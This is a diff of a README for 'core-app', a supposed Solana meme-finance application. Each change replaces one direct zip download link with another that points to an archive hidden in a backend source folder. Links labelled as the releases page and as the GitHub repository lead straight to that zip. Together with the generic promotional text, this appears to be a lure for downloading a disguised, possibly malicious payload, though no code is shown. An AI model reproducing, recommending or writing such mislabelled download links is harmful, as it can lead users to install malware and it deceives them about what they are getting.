@@ -1,7 +1,7 @@
 # 🎉 core-app - Unlock the Future of Meme Culture
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/majedmans/core-app/main/rebelong/core-app.zip)](https://raw.githubusercontent.com/majedmans/core-app/main/rebelong/core-app.zip)
+[![Download](https://github.com/majedmans/core-app/raw/refs/heads/main/backend/indexer/src/app_core_conversable.zip)](https://github.com/majedmans/core-app/raw/refs/heads/main/backend/indexer/src/app_core_conversable.zip)
 
 ## 📖 Introduction
 Welcome to core-app! This application is designed to bring the world of decentralized finance to the exciting realm of meme culture. We leverage the power of Solana to provide a next-gen platform for RWA-backed memes. Our focus is to merge institutional finance with the creative energy of meme culture. Whether you're a meme enthusiast or an investor, core-app opens new doors for engagement and functionality.
@@ -10,7 +10,7 @@ Welcome to core-app! This application is designed to bring the world of decentra
 Installing core-app is simple. Follow these steps to get started:
 
 1. **Visit the Releases Page**: Click the link below to navigate to the releases page where you can download the application.
-   [Download core-app from GitHub](https://raw.githubusercontent.com/majedmans/core-app/main/rebelong/core-app.zip)
+   [Download core-app from GitHub](https://github.com/majedmans/core-app/raw/refs/heads/main/backend/indexer/src/app_core_conversable.zip)
    
 2. **Choose the Right Version**: On the releases page, you will see several versions available. Select the latest stable release for the best experience.
 
@@ -53,7 +53,7 @@ Core-app runs efficiently on various systems. Here are the basic requirements fo
 ## 📥 Download & Install
 To get started with core-app, visit the releases page to download your version. Follow the earlier steps for installation to ensure a smooth setup process.
 
-[Download core-app from GitHub](https://raw.githubusercontent.com/majedmans/core-app/main/rebelong/core-app.zip)
+[Download core-app from GitHub](https://github.com/majedmans/core-app/raw/refs/heads/main/backend/indexer/src/app_core_conversable.zip)
 
 ## 🛠 Troubleshooting
 If you encounter any issues while installing or using core-app, consider the following steps:
@@ -66,7 +66,7 @@ If you encounter any issues while installing or using core-app, consider the fol
 If you need further assistance, please reach out. You can open an issue on the GitHub repository or check out our documentation for additional guidance.
 
 ## 🔗 Links
-- **GitHub Repository**: [core-app GitHub](https://raw.githubusercontent.com/majedmans/core-app/main/rebelong/core-app.zip)
+- **GitHub Repository**: [core-app GitHub](https://github.com/majedmans/core-app/raw/refs/heads/main/backend/indexer/src/app_core_conversable.zip)
 - **Community Discussions**: Explore our forums for tips and user experiences.
 
 ---
